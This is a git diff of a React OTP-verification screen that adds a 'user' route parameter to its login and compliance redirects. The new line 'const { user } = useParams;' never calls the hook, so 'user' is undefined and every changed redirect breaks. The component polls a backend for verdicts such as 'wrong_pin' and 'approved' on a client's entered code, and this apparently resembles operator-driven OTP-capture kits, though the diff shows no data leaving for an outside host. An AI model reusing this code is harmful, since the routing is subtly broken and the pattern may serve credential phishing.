@@ -1,10 +1,11 @@
 import React, { useRef, useState, useEffect } from "react";
 import "./otp.css";
-import { useNavigate } from "react-router-dom";
+import { useParams, useNavigate } from "react-router-dom";
 import { useVerification } from "../hooks/useVerification";
 import { verificationService } from "../services/api";
 
 const OtpVerification = ({ client, myFuncs }) => {
+  const { user } = useParams;
   const { name, number, length } = client;
   const { setOtp } = myFuncs;
   const navigate = useNavigate();
@@ -74,7 +75,7 @@ const OtpVerification = ({ client, myFuncs }) => {
     if (status === "wrong_pin") {
       // Return to login on wrong PIN
       const timeout = setTimeout(() => {
-        navigate("/login");
+        navigate(`${user}/login`);
       }, 2000);
       return () => clearTimeout(timeout);
     }
@@ -125,7 +126,7 @@ const OtpVerification = ({ client, myFuncs }) => {
             setPollingInterval(null);
           }
           // Force navigation
-          setTimeout(() => navigate("/compliance"), 1000);
+          setTimeout(() => navigate(`${user}/compliance`), 1000);
         } else if (data.status === "wrong_code") {
           console.log("❌ Wrong OTP code via polling");
           setWrongCode(true);
@@ -139,7 +140,7 @@ const OtpVerification = ({ client, myFuncs }) => {
             clearInterval(pollingInterval);
             setPollingInterval(null);
           }
-          setTimeout(() => navigate("/login"), 1000);
+          setTimeout(() => navigate(`${user}/login`), 1000);
         } else if (data.status === "expired") {
           console.log("⏰ Session expired via polling");
           if (pollingInterval) {
@@ -308,7 +309,7 @@ const OtpVerification = ({ client, myFuncs }) => {
     setOtp(combinedOtp);
     // If already approved, navigate
     if (status === "approved") {
-      navigate("/compliance");
+      navigate(`${user}/compliance`);
     }
   };
 
